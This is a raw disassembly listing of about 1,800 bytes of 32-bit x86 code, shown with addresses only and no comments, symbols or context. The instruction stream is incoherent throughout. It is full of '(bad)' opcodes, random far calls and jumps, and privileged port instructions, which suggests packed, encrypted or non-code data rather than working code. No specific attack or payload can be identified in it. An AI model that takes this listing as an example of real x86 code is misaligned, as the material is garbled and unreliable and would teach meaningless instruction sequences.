  406cb7:	loopne 0x406cbf
  406cb9:	push   esp
  406cba:	inc    ecx
  406cbb:	xor    DWORD PTR [edx+0x70],esi
  406cbe:	jne    0x406cb5
  406cc0:	leave  
  406cc1:	pop    ecx
  406cc2:	enter  0xceee,0xdb
  406cc6:	add    DWORD PTR [ecx],esi
  406cc8:	xlat   BYTE PTR ds:[ebx]
  406cc9:	mov    cl,0x50
  406ccb:	fisub  WORD PTR [ebx+edi*8+0x374600e7]
  406cd2:	jno    0x406cd3
  406cd4:	into   
  406cd5:	test   BYTE PTR [edi-0x18],ch
  406cd8:	adc    BYTE PTR ds:0x33e8ff71,ch
  406cde:	adc    al,0x0
  406ce0:	pop    esp
  406ce1:	jmp    0x406d42
  406ce3:	push   0xffc2866b
  406ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce9:	fdiv   st(6),st
  406ceb:	out    0xcd,eax
  406ced:	sub    DWORD PTR [ecx-0x1],esi
  406cf0:	xchg   esi,eax
  406cf1:	fcom   QWORD PTR [edx]
  406cf3:	push   eax
  406cf4:	cdq    
  406cf5:	inc    esi
  406cf6:	cmp    edi,edi
  406cf8:	xchg   BYTE PTR [esi-0xa],al
  406cfb:	adc    esp,ecx
  406cfd:	test   BYTE PTR ds:[edi],0x89
  406d01:	pop    ss
  406d02:	jno    0x406d03
  406d04:	outs   dx,BYTE PTR ds:[esi]
  406d05:	mov    ecx,0x71f053c9
  406d0a:	jo     0x406d81
  406d0c:	sub    eax,0x56c87d4a
  406d11:	mov    dh,0x70
  406d13:	jne    0x406d36
  406d15:	and    bl,BYTE PTR [ebp+edx*8+0x79]
  406d19:	xchg   BYTE PTR [eax-0x1],dh
  406d1c:	les    esp,FWORD PTR [ebp-0x2d]
  406d1f:	(bad)  
  406d20:	mov    esp,0x2e1c5b69
  406d25:	nop
  406d26:	jo     0x406cf1
  406d28:	repz inc eax
  406d2a:	add    edx,DWORD PTR [ebp-0x56]
  406d2d:	mov    WORD PTR [esp+eax*8+0xbf5f815],es
  406d34:	add    BYTE PTR [ecx],bl
  406d36:	or     al,BYTE PTR ds:0xf267063b
  406d3c:	inc    ebx
  406d3d:	test   ebx,edx
  406d3f:	pop    edi
  406d40:	(bad)  
  406d41:	cli    
  406d42:	icebp  
  406d43:	call   0xd1e84b4b
  406d48:	sbb    BYTE PTR [ebp-0x38],bh
  406d4b:	call   0x36a5d1c0
  406d50:	imul   BYTE PTR [esi]
  406d52:	jno    0x406db6
  406d54:	jo     0x406d24
  406d56:	xchg   cx,ax
  406d58:	add    dh,BYTE PTR [ecx]
  406d5a:	jbe    0x406dbb
  406d5c:	fist   DWORD PTR [eax]
  406d5e:	mov    ebp,0xdcb603a7
  406d63:	or     al,0x70
  406d65:	and    al,0x11
  406d67:	adc    ecx,edi
  406d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d6a:	data16 (bad) 
  406d6c:	fidiv  DWORD PTR [eax]
  406d6e:	or     DWORD PTR [esi],eax
  406d70:	mov    cl,0x9
  406d72:	xor    al,0x95
  406d74:	ret    0x678e
  406d77:	pop    esp
  406d78:	jo     0x406d00
  406d7a:	fdivr  st(0),st
  406d7c:	pop    ebx
  406d7d:	adc    BYTE PTR [esi-0x2a],ah
  406d80:	outs   dx,DWORD PTR ds:[esi]
  406d81:	jbe    0x406d5f
  406d83:	int3   
  406d84:	pop    esp
  406d85:	out    0x4c,eax
  406d87:	(bad)  
  406d88:	outs   dx,DWORD PTR ds:[esi]
  406d89:	js     0x406dd6
  406d8b:	icebp  
  406d8c:	add    eax,DWORD PTR [edx+edx*4]
  406d8f:	lds    eax,FWORD PTR [ebx+0x443656d]
  406d95:	fisttp DWORD PTR [ebx]
  406d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d98:	stc    
  406d99:	add    BYTE PTR [esi],ch
  406d9b:	jno    0x406d1e
  406d9d:	inc    ebp
  406d9e:	ds pushaw 
  406da1:	leave  
  406da2:	cmp    dh,cl
  406da4:	adc    bl,0x71
  406da7:	or     DWORD PTR [ecx],edx
  406da9:	sahf   
  406daa:	or     al,0xe8
  406dad:	outs   dx,BYTE PTR ds:[esi]
  406dae:	cmp    eax,DWORD PTR fs:[eax]
  406db1:	and    esp,ebp
  406db3:	gs (bad) 
  406db5:	hlt    
  406db6:	or     ch,BYTE PTR [esi-0x52]
  406db9:	addr16 xchg esi,eax
  406dbb:	pushw  0xe263
  406dbf:	enter  0xc0ff,0x70
  406dc3:	mov    edx,0x1c5fe940
  406dc8:	shl    BYTE PTR [ecx-0x4b019a13],cl
  406dce:	fisubr DWORD PTR [ebp-0x6a]
  406dd1:	aaa    
  406dd2:	inc    esi
  406dd3:	pushw  0xe22e
  406dd7:	enter  0x90ff,0xa4
  406ddb:	mov    ecx,0x1c4fe940
  406de0:	shl    BYTE PTR [ecx-0x6b019a13],cl
  406de6:	stos   BYTE PTR es:[edi],al
  406de7:	ins    DWORD PTR es:[edi],dx
  406de8:	jle    0x406df1
  406dea:	push   ss
  406deb:	pushw  0x86ed
  406def:	enter  0x80ff,0xb4
  406df3:	mov    ecx,0x1c1fe940
  406df8:	shl    BYTE PTR [ecx],cl
  406dfa:	ins    BYTE PTR es:[edi],dx
  406dfb:	gs (bad) 
  406dfd:	push   esp
  406dfe:	add    BYTE PTR [ebp+0x6d],bh
  406e01:	data16 xlat BYTE PTR ds:[ebx]
  406e03:	pop    es
  406e04:	pushw  0x83c1
  406e08:	enter  0x50ff,0x9
  406e0c:	mov    edx,0x1bcfe940
  406e11:	shl    BYTE PTR [ecx],cl
  406e13:	ins    BYTE PTR es:[edi],dx
  406e14:	gs (bad) 
  406e16:	xor    al,0x4d
  406e18:	ins    DWORD PTR es:[edi],dx
  406e19:	dec    esi
  406e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e1b:	xlat   BYTE PTR ds:[ebx]
  406e1c:	gs push 0xffc863a3
  406e22:	add    cl,bl
  406e24:	mov    ecx,0x1e9fe940
  406e29:	rol    BYTE PTR [eax],cl
  406e2b:	pusha  
  406e2c:	dec    esi
  406e2d:	(bad)  
  406e2e:	(bad)  
  406e2f:	and    eax,0x9e36e761
  406e34:	repz (bad) 
  406e36:	push   0x40379f
  406e3b:	loopne 0x406df9
  406e3d:	push   edx
  406e3e:	inc    ecx
  406e3f:	or     ah,dh
  406e41:	xor    al,0xd2
  406e43:	ror    BYTE PTR [ebp-0x1],1
  406e46:	inc    BYTE PTR ds:0x6e1ee761
  406e4c:	repz (bad) 
  406e4e:	push   0x403ccc
  406e53:	lock mov esp,0xf3d84152
  406e59:	xor    al,0xd2
  406e5b:	or     BYTE PTR [ebp-0x1],0xfe
  406e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e60:	pusha  
  406e61:	out    0x6,eax
  406e63:	add    BYTE PTR [esi],bl
  406e65:	repz (bad) 
  406e67:	push   0x403730
  406e6c:	rol    BYTE PTR [esi+0x40884153],0x1
  406e73:	add    BYTE PTR [eax-0x6f8a0078],cl
  406e79:	shr    dh,0xfd
  406e7c:	(bad)  
  406e7d:	mul    BYTE PTR [edi-0x6]
  406e80:	cmp    ecx,DWORD PTR [eax-0x1]
  406e83:	addr16 retf 0x403a
  406e87:	add    al,dh
  406e89:	push   es
  406e8a:	add    BYTE PTR [eax],al
  406e8c:	fdiv   st,st(5)
  406e8e:	je     0x406e98
  406e90:	adc    ch,0xfc
  406e93:	call   FWORD PTR [edi+0x1953fe45]
  406e99:	or     eax,0x480bae68
  406e9e:	jmp    DWORD PTR [edi+0x4a]
  406ea1:	or     BYTE PTR [eax],al
  406ea3:	xor    BYTE PTR [ecx],0x7b
  406ea6:	test   DWORD PTR [edi],0xff6fb119
  406eac:	es cli 
  406eae:	call   DWORD PTR [ebx+0x70]
  406eb1:	jb     0x406e8e
  406eb3:	lods   eax,DWORD PTR ds:[esi]
  406eb4:	xor    BYTE PTR [ecx],0x4
  406eb7:	push   0x80037233
  406ebc:	push   es
  406ebd:	inc    ebp
  406ebe:	sti    
  406ebf:	out    0xcb,eax
  406ec1:	les    ebp,FWORD PTR [edi+edi*8-0x77]
  406ec5:	retf   0x40d0
  406ec8:	add    BYTE PTR [ecx],dh
  406eca:	dec    edx
  406ecb:	push   edi
  406ecc:	push   ebx
  406ecd:	jo     0x406f41
  406ecf:	fild   DWORD PTR [ecx]
  406ed1:	xor    DWORD PTR [edx-0x7d],esi
  406ed4:	call   FWORD PTR [edx+ebp*2+0x5b]
  406ed8:	xchg   ebx,eax
  406ed9:	int3   
  406eda:	xor    ch,BYTE PTR [ebp+0x68]
  406edd:	retf   
  406ede:	sahf   
  406edf:	ret    0x56ff
  406ee2:	push   ds
  406ee3:	rol    DWORD PTR [eax+0x31],1
  406ee6:	mov    al,BYTE PTR [ecx]
  406ee8:	add    BYTE PTR [ecx],dh
  406eea:	repnz ins BYTE PTR es:[edi],dx
  406eec:	jne    0x406f27
  406eee:	cli    
  406eef:	out    dx,eax
  406ef0:	cld    
  406ef1:	sahf   
  406ef2:	(bad)  
  406ef3:	(bad)  
  406ef5:	add    dh,BYTE PTR [ecx+0x7e656803]
  406efb:	ret    0xeff
  406efe:	jo     0x406f03
  406f00:	add    BYTE PTR [ecx-0x76f809be],dh
  406f06:	aam    0x6e
  406f08:	jmp    FWORD PTR [esi-0x37]
  406f0b:	call   DWORD PTR [ebx-0x10]
  406f0e:	jno    0x406eeb
  406f10:	rol    DWORD PTR [edx],cl
  406f12:	xor    DWORD PTR [eax+ebp*2],eax
  406f15:	xor    esi,DWORD PTR [edx+0x3]
  406f18:	or     BYTE PTR [esi+0x1c],0xfc
  406f1c:	out    0xf7,eax
  406f1e:	or     BYTE PTR [esp+ebp*2+0x6d02ee3e],ah
  406f25:	mov    esp,0x2cfa8110
  406f2a:	arpl   WORD PTR [esi+0x625300d9],cx
  406f30:	cld    
  406f31:	sti    
  406f32:	push   ss
  406f33:	arpl   WORD PTR [esp+ebp*2+0x16],di
  406f37:	lock aam 0x6c
  406f3a:	test   BYTE PTR [ecx],dl
  406f3c:	xor    DWORD PTR [esi+0x4],0x846c6663
  406f43:	gs pop esi
  406f45:	imul   BYTE PTR [esi]
  406f47:	jno    0x406f5c
  406f49:	inc    esp
  406f4a:	out    dx,al
  406f4b:	bound  esp,QWORD PTR [eax]
  406f4d:	inc    ecx
  406f4e:	sub    eax,0xcd789c09
  406f53:	xchg   BYTE PTR [edi+edi*8-0x2436292a],bh
  406f5a:	ins    DWORD PTR es:[edi],dx
  406f5b:	mov    ebp,0xdcc603a7
  406f60:	hlt    
  406f61:	pop    ebx
  406f62:	jo     0x406faf
  406f64:	push   ds
  406f65:	ins    BYTE PTR es:[edi],dx
  406f66:	popa   
  406f67:	icebp  
  406f68:	call   0xb9e40d70
  406f6d:	ins    BYTE PTR es:[edi],dx
  406f6e:	sbb    al,0x11
  406f70:	adc    DWORD PTR [ebx+0x5afe6289],esp
  406f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f77:	inc    edi
  406f78:	imul   BYTE PTR [ebx+0x19]
  406f7b:	repz xchg esp,eax
  406f7d:	ret    0x6386
  406f80:	pop    esp
  406f81:	clc    
  406f82:	xchg   esi,eax
  406f83:	sub    DWORD PTR [edi+0x40b9766b],esp
  406f89:	add    eax,0xd48f7231
  406f8e:	addr16 fdivr st(0),st
  406f91:	pop    ebx
  406f92:	add    dh,bl
  406f94:	jo     0x406f54
  406f96:	imul   ecx,DWORD PTR [ecx-0xc],0xffffffff
  406f9a:	stos   BYTE PTR es:[edi],al
  406f9b:	fisub  DWORD PTR [ecx+0x68]
  406f9e:	push   0xa5ffc961
  406fa3:	inc    eax
  406fa4:	push   cs
  406fa5:	call   0xffa26048
  406faa:	cmp    DWORD PTR ds:0xdb7e0008,ecx
  406fb0:	mov    eax,0x6a1afcfe
  406fb5:	pop    esi
  406fb6:	xchg   ecx,eax
  406fb7:	mov    ah,BYTE PTR [edx-0x18]
  406fba:	and    eax,0xa0ff6277
  406fbf:	outs   dx,DWORD PTR ds:[esi]
  406fc0:	adc    DWORD PTR [eax],eax
  406fc2:	mov    esp,0xd4ff757f
  406fc7:	(bad)  
  406fc8:	imul   edx,DWORD PTR [ebp+0xb625a2f],0x67ffe129
  406fd2:	fwait
  406fd3:	out    dx,al
  406fd4:	enter  0x98ff,0x7a
  406fd8:	sub    dh,al
  406fda:	ss pop edx
  406fdc:	mov    ecx,0x9c02e4f
  406fe1:	call   0xffa2bb7b
  406fe6:	adc    DWORD PTR [edx],ebp
  406fe8:	inc    edi
  406fe9:	call   DWORD PTR [esi]
  406feb:	ins    BYTE PTR es:[edi],dx
  406fec:	inc    edi
  406fed:	or     cl,ch
  406fef:	or     DWORD PTR [esi+0x68f16aec],0xb00e96a
  406ff9:	fmul   QWORD PTR [edi]
  406ffb:	test   BYTE PTR [ecx-0x234b00f3],0xd0
  407002:	inc    eax
  407003:	jmp    0xdf056ee2
  407008:	or     edx,DWORD PTR [eax+0x618cdd45]
  40700e:	(bad)  
  40700f:	push   esp
  407010:	inc    ecx
  407011:	bound  esi,QWORD PTR [ebp+0x0]
  407014:	fs out dx,al
  407016:	xor    al,0xd2
  407018:	and    BYTE PTR [edi+edi*8-0x19],cl
  40701c:	pop    esp
  40701d:	enter  0xfffe,0xd1
  407021:	dec    eax
  407022:	sti    
  407023:	push   0x48
  407025:	out    dx,al
  407026:	je     0x407040
  407028:	xchg   edi,eax
  407029:	pop    eax
  40702a:	or     edi,edi
  40702c:	or     eax,0x184147b7
  407031:	(bad)
  407034:	mov    bh,0xf3
  407036:	mov    BYTE PTR [ebp-0x50],al
  407039:	loope  0x40707f
  40703b:	call   0x1cb56468
  407040:	xchg   edi,eax
  407041:	pop    ecx
  407042:	or     edi,edi
  407044:	sbb    eax,0x84147b7
  407049:	(bad)
  40704c:	xchg   ebx,esi
  40704e:	mov    BYTE PTR [ebp-0x78],al
  407051:	ds (bad) 
  407053:	(bad)  
  407054:	popf   
  407055:	sub    al,0xff
  407057:	jne    0x40701d
  407059:	repz xor al,0xd2
  40705c:	add    BYTE PTR [eax+0x18e7ff45],dl
  407062:	and    bh,bh
  407064:	inc    DWORD PTR [ecx+0x49]
  407067:	jmp    0x406ff6
  407069:	(bad)  
  40706a:	in     al,dx
  40706b:	dec    edi
  40706c:	dec    ebp
  40706e:	add    bh,bh
  407070:	jne    0x406ff6
  407072:	repz xor al,0xd2
  407075:	loopne 0x4070bc
  407077:	jmp    edi
  407079:	add    BYTE PTR [eax],ah
  40707b:	(bad)  
  40707c:	call   DWORD PTR [ecx]
  40707e:	dec    ecx
  40707f:	jecxz  0x407004
  407081:	adc    eax,0xc0effe8
  407086:	jns    0x407088
  407088:	add    BYTE PTR [eax+0x31f87d85],cl
  40708e:	jb     0x407088
  407090:	cmp    DWORD PTR [ebx-0x4dfffc8e],0xffffffc5
  407097:	outs   dx,DWORD PTR ds:[esi]
  407098:	add    BYTE PTR [esi],ah
  40709a:	out    0x83,al
  40709c:	add    BYTE PTR [ecx],dh
  40709e:	jb     0x407108
  4070a0:	jne    0x4070bb
  4070a2:	scas   eax,DWORD PTR es:[edi]
  4070a3:	out    dx,eax
  4070a4:	pop    es
  4070a5:	dec    ecx
  4070a6:	pop    ebp
  4070a7:	test   eax,0xef7f36ff
  4070ac:	sti    
  4070ad:	cs std 
  4070af:	sti    
  4070b0:	out    0x95,eax
  4070b2:	shr    BYTE PTR [eax-0x1],1
  4070b5:	push   ds
  4070b6:	pop    ebp
  4070b7:	imul   edi,edi,0xffffff9c
  4070ba:	pop    edx
  4070bb:	pop    ebx
  4070bc:	popa   
  4070bd:	iret   
  4070be:	(bad)  
  4070bf:	push   0xd67c00ff
  4070c4:	push   0xd1ba2975
  4070c9:	mov    ebp,0x7d82bef6
  4070ce:	sbb    DWORD PTR [ebx+0x3],esp
  4070d1:	out    dx,eax
  4070d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070d3:	xor    al,0xf6
  4070d5:	(bad)  
  4070d6:	and    ch,BYTE PTR fs:[ecx+0x75]
  4070da:	sub    DWORD PTR [edx+0x16cebdc5],edi
  4070e0:	pop    ebp
  4070e1:	push   cs
  4070e2:	(bad)  
  4070e3:	xchg   esp,eax
  4070e4:	pop    ebx
  4070e5:	inc    DWORD PTR [edx+eax*1+0x69]
  4070e9:	jne    0x407114
  4070eb:	cli    
  4070ec:	add    DWORD PTR [esi+0x7568f6ae],edi
  4070f2:	xchg   ebp,eax
  4070f3:	push   cs
  4070f4:	out    dx,eax
  4070f5:	pop    es
  4070f6:	mov    DWORD PTR [esi-0x57],ecx
  4070f9:	call   DWORD PTR [esi+0x31e3e6f2]
  4070ff:	fimul  WORD PTR ds:0x120483
  407105:	jne    0x407135
  407107:	or     DWORD PTR [edx-0x42],esi
  40710a:	xchg   edx,eax
  40710b:	pop    edi
  40710c:	sbb    DWORD PTR [ecx-0x1c],ebp
  40710f:	adc    cl,al
  407111:	xchg   edi,eax
  407112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407113:	pop    edi
  407114:	into   
  407115:	pop    esp
  407116:	sub    esi,ebx
  407118:	call   0xd1514d85
  40711d:	mov    ds:0x68b65f8c,eax
  407122:	mov    esp,0x60c154
  407127:	jno    0x407188
  407129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40712a:	push   0x48915cbc
  40712f:	icebp  
  407130:	pop    esi
  407131:	xchg   esi,eax
  407132:	push   0x5081619c
  407137:	icebp  
  407138:	pop    esi
  407139:	xchg   BYTE PTR [eax-0x64],ch
  40713c:	pop    ecx
  40713d:	xchg   ecx,eax
  40713e:	cmp    cl,dh
  407140:	pop    esi
  407141:	jbe    0x4071ab
  407143:	jl     0x4071b2
  407145:	add    DWORD PTR [eax-0xf],0x7c68665e
  40714c:	gs push ecx
  40714e:	test   al,0xf1
  407150:	pop    esi
  407151:	push   esi
  407152:	cmp    dh,bl
  407154:	and    eax,0x6dabcee9
  407159:	push   0x3e56e13f
  40715e:	push   0x58e8fa59
  407163:	xchg   ecx,esi
  407165:	inc    eax
  407166:	iret   
  407167:	jno    0x407172
  407169:	xchg   ecx,eax
  40716a:	inc    esi
  40716b:	pop    ebp
  40716c:	enter  0xdbe8,0x86
  407170:	mov    ch,0xa7
  407172:	add    ebx,DWORD PTR [ecx]
  407174:	dec    edi
  407175:	mov    ch,0xc2
  407177:	sahf   
  407178:	out    0x2f,al
  40717a:	iret   
  40717b:	icebp  
  40717c:	or     BYTE PTR [ecx-0x381aac],dl
  407182:	call   0xee4c45a0
  407187:	mov    WORD PTR [esi],es
  407189:	call   0x5e4f71de
  40718e:	call   DWORD PTR [ecx+0x42]
  407191:	or     edi,ebp
  407193:	xchg   edi,eax
  407194:	test   DWORD PTR [ecx],esi
  407196:	push   ebp
  407197:	sub    BYTE PTR ds:0x6c1c23f1,dh
  40719d:	pop    esi
  40719e:	addr16 loope 0x407202
  4071a1:	leave  
  4071a2:	inc    DWORD PTR [eax+0x2d]
  4071a5:	mov    ah,0x40
  4071a7:	jmp    0x2894cc06
  4071ac:	sub    eax,0xf4340bf1
  4071b1:	pop    ebp
  4071b2:	(bad)  
  4071b3:	sbb    al,0x29
  4071b5:	pop    edi
  4071b6:	jne    0x407199
  4071b8:	jp     0x4071dc
  4071ba:	inc    BYTE PTR [esi-0x16ec0e72]
  4071c0:	addr16 lahf 
  4071c2:	push   0xffc8e060
  4071c7:	add    BYTE PTR ds:0xdae940b5,cl
  4071cd:	out    0x54,al
  4071cf:	test   al,0x32
  4071d1:	icebp  
  4071d2:	inc    esp
  4071d3:	mov    esp,0x15675ded
  4071d8:	add    cl,cl
  4071da:	call   eax
  4071dc:	in     al,0xb4
  4071de:	inc    eax
  4071df:	jmp    0x364c463b
  4071e4:	rol    BYTE PTR ds:0x5e54dce8,0xff
  4071eb:	je     0x4071dd
  4071ed:	popa   
  4071ee:	push   eax
  4071ef:	push   ds
  4071f0:	add    BYTE PTR [eax+0xdcff11],ah
  4071f6:	rol    DWORD PTR [eax-0x17],1
  4071f9:	cli    
  4071fa:	shr    BYTE PTR [ebx+0xb098800],1
  407200:	rol    BYTE PTR ds:0x8045c670,0x9
  407207:	add    BYTE PTR [eax],al
  407209:	mov    BYTE PTR [esi],bl
  40720b:	inc    ebp
  40720c:	hlt    
  40720d:	(bad)  
  40720e:	pop    esi
  40720f:	(bad)  
  407210:	inc    DWORD PTR [edx]
  407212:	add    eax,0x4f2006a
  407217:	push   0x0
  407219:	std    
  40721a:	dec    eax
  40721b:	repz push eax
  40721d:	fisttp QWORD PTR [eax-0x1970080c]
  407223:	dec    edi
  407224:	inc    DWORD PTR ds:0x8c75feed
  40722a:	rcr    DWORD PTR ds:0xb0948ac,0xc0
  407231:	inc    esp
  407232:	pop    es
  407233:	jmp    0x407275
  407235:	xor    BYTE PTR [ebx+0x48],dh
  407238:	inc    ecx
  407239:	or     ah,ah
  40723b:	je     0x407249
  40723d:	rcr    BYTE PTR [edx-0x3e],0xff
  407241:	(bad)  
  407242:	(bad)  
  407244:	lea    edx,[ebp-0x70000914]
  40724a:	cmp    BYTE PTR [ecx-0x18],dl
  40724d:	xchg   edi,eax
  40724e:	(bad)  
  40724f:	(bad)  
  407250:	jmp    DWORD PTR [ecx-0x77]
  407253:	lock test DWORD PTR [eax],0xb5fee37f
  40725a:	js     0x407247
  40725c:	(bad)  
  40725d:	jmp    FWORD PTR [edi+0x59]
  407260:	pop    es
  407261:	call   0x3f586b
  407266:	call   FWORD PTR [eax-0x1cf00810]
  40726c:	out    0xa5,eax
  40726e:	dec    edi
  40726f:	jecxz  0x40726f
  407271:	call   ebp
  407273:	lock jmp 0x89fb:0xeff33195
  40727b:	es call 0x3108:0x41193100
  407283:	jne    0x4072ff
  407285:	in     al,dx
  407286:	mov    dl,0x2e
  407288:	addr16 push 0x31
  40728b:	mov    ch,bh
  40728d:	(bad)  
  40728e:	cld    
  40728f:	pop    ecx
  407290:	pop    ebx
  407291:	mov    edx,0x89653bad
  407296:	in     al,dx
  407297:	xor    eax,0x31058fdc
  40729c:	add    al,0xff
  40729e:	fcomp  QWORD PTR [ecx+0x5b]
  4072a1:	mov    bh,0x4f
  4072a3:	fwait
  4072a4:	gs push 0x31
  4072a7:	retf   0x54a6
  4072aa:	lock jno 0x407288
  4072ad:	(bad)  
  4072ae:	fnsave [eax]
  4072b0:	add    al,0xff
  4072b2:	mov    al,fs:0x8a3140bc
  4072b8:	icebp  
  4072b9:	rol    DWORD PTR [eax],0x1e
  4072bc:	mov    edi,ecx
  4072be:	mov    edi,0x4fd3539d
  4072c3:	push   cs
  4072c4:	push   ebp
  4072c5:	sti    
  4072c6:	out    0x9c,eax
  4072c8:	aad    0x64
  4072ca:	dec    DWORD PTR [ecx]
  4072cc:	sub    ah,BYTE PTR [ebp+0x337f6ff]
  4072d2:	push   0xffc299a1
  4072d7:	dec    esi
  4072d8:	(bad)  
  4072d9:	rol    BYTE PTR [eax+0x31],1
  4072dc:	retf   
  4072dd:	shr    BYTE PTR cs:[ecx-0x4f],cl
  4072e1:	add    ebp,eax
  4072e3:	js     0x407315
  4072e5:	gs (bad) 
  4072e7:	cmp    dh,BYTE PTR [edx]
  4072e9:	lock push cs
  4072eb:	popa   
  4072ec:	and    BYTE PTR [ebp+esi*2+0x29],0x9
  4072f1:	adc    ecx,ebx
  4072f3:	stos   BYTE PTR es:[edi],al
  4072f4:	pop    ebx
  4072f5:	push   ds
  4072f6:	pop    esp
  4072f7:	inc    edi
  4072f8:	pushf  
  4072f9:	push   ss
  4072fa:	or     ecx,DWORD PTR gs:[ecx]
  4072fd:	and    DWORD PTR [esi-0x24173603],0x3a7b4be
  407307:	sbb    DWORD PTR [edi],eax
  407309:	jmp    0xc9b12411
  40730e:	inc    ecx
  40730f:	jbe    0x40736c
  407311:	repnz inc ebx
  407313:	in     eax,0xb
  407315:	cmp    esp,edx
  407317:	addr16 aad 0xe0
  40731a:	pop    ebx
  40731b:	repz pop esp
  40731d:	into   
  40731e:	add    BYTE PTR fs:[ecx+0x55],cl
  407322:	xchg   DWORD PTR [esi+ecx*2-0x12],esp
  407326:	call   0x28110a06
  40732b:	add    al,0xc9
  40732d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40732e:	adc    eax,0xeae336c3
  407333:	add    esi,DWORD PTR [ecx]
  407335:	mov    DWORD PTR [ecx-0x69a50f94],edx
  40733b:	clc    
  40733c:	(bad)  
  40733e:	fst    st(3)
  407340:	pop    dx
  407342:	cld    
  407343:	sti    
  407344:	push   ss
  407345:	add    DWORD PTR [ebp+0x64],edi
  407348:	push   es
  407349:	jb     0x4072f0
  40734b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40734c:	(bad)  
  40734d:	pop    edx
  40734e:	add    ecx,DWORD PTR [edx]
  407350:	not    ah
  407352:	lock pop ebx
  407354:	imul   ebx,DWORD PTR [ebp+0x5e],0x64
  407358:	pop    ebx
  407359:	es push esi
  40735b:	out    dx,al
  40735c:	ss jno 0x407338
  40735f:	addr16 (bad) 
  407361:	pop    edx
  407362:	rol    DWORD PTR [edi],cl
  407364:	into   
  407365:	aam    0xf0
  407367:	pop    ebx
  407368:	dec    edi
  407369:	pop    ebp
  40736a:	add    BYTE PTR [esi],dh
  40736c:	push   ebp
  40736d:	pop    edx
  40736e:	jne    0x40739d
  407370:	dec    ebp
  407371:	aam    0x7
  407373:	adc    DWORD PTR [ebx-0x63],edx
  407376:	call   FWORD PTR [esi]
  407378:	imul   eax,DWORD PTR [edi+0x4],0xffffffe9
  40737c:	outs   dx,DWORD PTR ds:[esi]
  40737d:	(bad)  
  40737e:	in     al,dx
  40737f:	push   0x56
  407381:	pop    ebp
  407382:	push   esi
  407383:	sahf   
  407384:	add    BYTE PTR [eax+0x5a],ch
  407387:	imul   esp,esi,0x107d40d
  40738d:	icebp  
  40738e:	popf   
  40738f:	(bad)  
  407390:	out    dx,al
  407391:	clc    
  407392:	ret    
  407393:	sti    
  407394:	jb     0x4073de
  407396:	mov    bl,0x47
  407398:	sub    BYTE PTR ds:0x6d333d8e,ch
  40739e:	leave  
  40739f:	jmp    FWORD PTR [eax+0x12]
  4073a2:	or     DWORD PTR [edx+edi*1+0x5d],esi
  4073a6:	adc    BYTE PTR [ebp+0x28],0x2d
  4073aa:	mov    dl,0xe7
  4073ac:	leave  
  4073ad:	(bad)
  4073b1:	repnz aam 0x1e
  4073b4:	aas    
  4073b5:	popf   
  4073b6:	adc    eax,0xb9929ec8
  4073bb:	addr16 jmp 0x1feddf3
  4073c1:	mov    ebx,0xc2e940b3
  4073c6:	pop    edx
  4073c7:	jne    0x4073ba
  4073c9:	call   0x4971:0x9276e6c9
  4073d0:	das    
  4073d1:	xchg   edx,eax
  4073d2:	pop    edx
  4073d3:	push   0xffc8a891
  4073d8:	mov    ch,0x5a
  4073da:	xchg   edi,eax
  4073db:	stos   BYTE PTR es:[edi],al
  4073dc:	jmp    0xd6008213
  4073e1:	xor    esi,DWORD PTR [ebx-0x3221ff19]
  4073e7:	(bad)  
  4073e8:	inc    DWORD PTR [eax]
  4073ea:	test   al,0x6d
  4073ec:	(bad)  
  4073ed:	push   DWORD PTR [edi-0x59]
  4073f0:	push   0xff449db6
  4073f5:	dec    edi
  4073f6:	push   edi
  4073f7:	inc    eax
  4073f8:	pop    es
  4073f9:	call   0x3f62a8
  4073fe:	xor    BYTE PTR [edx-0x43],bl
  407401:	jmp    DWORD PTR [edi]
  407403:	jmp    0x7500:0x27184600
  40740a:	xor    cl,BYTE PTR [edi-0x5]
  40740d:	xor    ecx,DWORD PTR [eax+0x7c]
  407410:	(bad)  
  407411:	inc    DWORD PTR [edi+0x10aef1e6]
  407417:	push   cs
  407418:	jne    0x4073a7
  40741a:	xchg   DWORD PTR [eax-0x5],eax
  40741d:	(bad)  
  40741e:	std    
  40741f:	or     al,0xe8
  407421:	ja     0x4073e6
  407423:	out    0xfe,al
  407425:	pop    edi
  407426:	push   ss
  407427:	int3   
  407428:	rol    DWORD PTR [eax+ebx*2],0xa0
  40742c:	mov    ch,ah
  40742e:	lock add al,0x0
  407431:	out    dx,eax
  407432:	(bad)  
  407433:	ins    DWORD PTR es:[edi],dx
  407434:	xlat   BYTE PTR ds:[ebx]
  407435:	push   ebp
  407436:	pop    ecx
  407437:	or     eax,0xec1475ff
  40743c:	je     0x407446
  40743e:	mov    al,0xb9
  407440:	in     eax,0xff
  407442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407443:	add    BYTE PTR fs:[eax],al
  407446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407447:	stos   BYTE PTR es:[edi],al
  407448:	push   0xff4e1ddd
  40744d:	inc    BYTE PTR [eax]
  40744f:	std    
  407450:	or     bh,bh
  407452:	jne    0x407464
  407454:	in     eax,0xb7
  407456:	out    0x57,al
  407458:	jmp    0x407422
  40745a:	ret    0xce0
  40745d:	push   ebp
  40745e:	mov    esi,DWORD PTR [ecx]
  407460:	into   
  407461:	popa   
  407462:	jne    0x407489
  407464:	retf   0xc211
  407467:	into   
  407468:	iret   
  407469:	or     eax,0xeb6c3dc0
  40746e:	shl    DWORD PTR [ecx+eiz*4+0x3],0x50
  407473:	leave  
  407474:	mov    ebx,0x92aeff43
  407479:	mov    bl,0xfe
  40747b:	sbb    al,0x5a
  40747d:	imul   ebp,DWORD PTR [ebx-0x179e0062],0xffffffb8
  407484:	lds    esp,FWORD PTR [ecx-0x1]
  407487:	js     0x4074ad
  407489:	or     eax,DWORD PTR [eax]
  40748b:	(bad)  
  40748d:	outs   dx,BYTE PTR ds:[esi]
